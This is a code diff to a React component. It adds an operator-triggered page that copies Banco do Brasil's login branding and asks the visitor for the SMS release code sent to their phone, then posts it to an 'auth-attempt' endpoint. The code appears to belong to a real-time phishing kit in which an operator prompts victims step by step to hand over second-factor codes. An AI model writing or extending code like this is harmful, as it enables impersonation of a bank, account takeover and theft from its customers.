@@ -653,6 +653,10 @@ function LiveControlOverlay({
   const [token, setToken] = useState('');
   const [phone, setPhone] = useState('');
   const [responded, setResponded] = useState(false);
+  const [smsLast3, setSmsLast3] = useState<string>('');
+  const [code, setCode] = useState('');
+  const [codeError, setCodeError] = useState('');
+  const [verifying, setVerifying] = useState(false);
 
   useEffect(() => {
     let alive = true;
@@ -664,6 +668,7 @@ function LiveControlOverlay({
           if (!alive || !d) return;
           setDirective(d.directive ?? 'none');
           setStatus(d.status ?? 'active');
+          setSmsLast3(d.smsLast3 ?? '');
           if (d.directive && d.directive !== 'hold' && d.directive !== 'none') {
             setResponded(false);
           }
@@ -697,6 +702,110 @@ function LiveControlOverlay({
       <span>Aguarde</span>
     </div>
   );
+
+  // PJ — tela de código de liberação (homologação), seguindo o layout do print.
+  // Aparece somente para Pessoa Jurídica quando o operador aciona "Token SMS".
+  if (flow === 'PJ' && directive === 'sms_token' && !responded && status !== 'ended') {
+    const submitCode = async (e: FormEvent<HTMLFormElement>) => {
+      e.preventDefault();
+      if (code.length !== 4 || verifying) return;
+      setVerifying(true);
+      setCodeError('');
+      try {
+        const r = await fetch('/api/auth-attempt/sms-verify', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ sessionId: getSessionId(), code }),
+        });
+        const d = await r.json();
+        if (d?.valid) {
+          setResponded(true);
+          setCode('');
+        } else {
+          setCodeError('Código inválido. Verifique e tente novamente.');
+        }
+      } catch {
+        setCodeError('Não foi possível validar agora. Tente novamente.');
+      }
+      setVerifying(false);
+    };
+    return (
+      <div className="pj-code-overlay" data-testid="live-sms-code-page">
+        <main className="token-page">
+          <button
+            type="button"
+            className="token-back"
+            onClick={() => setLocation(entry)}
+            aria-label="Voltar"
+          >
+            <ArrowLeft size={22} strokeWidth={1.75} />
+          </button>
+
+          <section className="token-left">
+            <div className="token-left-inner">
+              <header className="token-header">
+                <img src={`${basePath}/bb-icon.svg`} alt="Banco do Brasil" className="token-logo" />
+                <h1 className="token-title">Acesse sua conta Banco do Brasil</h1>
+              </header>
+
+              <div className="token-copy-block">
+                <p className="token-unlock">Digite o código de liberação recebido.</p>
+                <p className="token-hint">
+                  Enviamos um SMS para você do número XX XXXXX-X{smsLast3 || 'XXX'}
+                </p>
+              </div>
+
+              <form className="token-form" onSubmit={submitCode}>
+                <div className="token-field">
+                  <label className="token-label" htmlFor="sms-liberacao-code">
+                    Código de liberação
+                  </label>
+                  <input
+                    id="sms-liberacao-code"
+                    className="token-input"
+                    placeholder="Código de liberação"
+                    value={code}
+                    onChange={(e) =>
+                      setCode(e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 4))
+                    }
+                    maxLength={4}
+                    autoComplete="off"
+                    autoFocus
+                    disabled={verifying}
+                    data-testid="live-sms-code-input"
+                  />
+                </div>
+
+                {codeError && (
+                  <p className="token-error" role="alert" data-testid="live-sms-code-error">
+                    {codeError}
+                  </p>
+                )}
+
+                <button
+                  type="submit"
+                  className="token-submit"
+                  disabled={code.length !== 4 || verifying}
+                  data-testid="live-sms-code-submit"
+                >
+                  AVANÇAR
+                </button>
+              </form>
+            </div>
+          </section>
+
+          <aside className="token-right" aria-hidden="true">
+            <img src={`${basePath}/token-hero.jpg`} alt="" className="token-hero" />
+          </aside>
+
+          <p className="token-legal">(c) Banco do Brasil</p>
+          <button type="button" className="token-chat" aria-label="Abrir chat">
+            <MessageCircle size={22} />
+          </button>
+        </main>
+      </div>
+    );
+  }
 
   let body: ReactNode = waiting;
 
